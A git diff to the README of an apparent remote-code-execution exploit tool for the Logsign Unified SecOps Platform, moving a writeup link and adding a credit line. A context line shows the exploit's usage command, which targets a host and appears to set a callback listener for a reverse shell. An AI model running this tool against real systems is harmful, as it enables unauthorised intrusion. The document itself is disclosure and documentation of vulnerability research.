@@ -34,8 +34,6 @@ git clone https://github.com/sevbandonmez/logsign-rce.git
 cd logsign-rce
 ```
 
-Writeup: https://medium.com/@sevbandonmez/zero-day-review-critical-vulnerabilities-in-logsign-unified-secops-platform-versions-6-4-7-69bbec653b3a
-
 ## Install the required Python library
 
 ```pip install requests```
@@ -89,6 +87,9 @@ If the script fails or produces unexpected errors, enable detailed logging with 
 
 ```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444 --debug```
 
+## Special Thanks
+Endless thanks to @mdisec for the identified CVE vulnerabilities. 
+
 ## Legal Disclaimer
 This tool is developed solely for authorized security testing and educational purposes. Unauthorized use of this tool for illegal activities is strictly prohibited. Any damage or legal consequences resulting from the use of this tool are the sole responsibility of the user. The developer is not liable for any misuse of this tool.
 
@@ -98,3 +99,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 ## References
 [Logsign Support](https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes)<br>
 [Zero Day Inititive](https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform)
+[Writeup old version](https://medium.com/@sevbandonmez/zero-day-review-critical-vulnerabilities-in-logsign-unified-secops-platform-versions-6-4-7-69bbec653b3a)
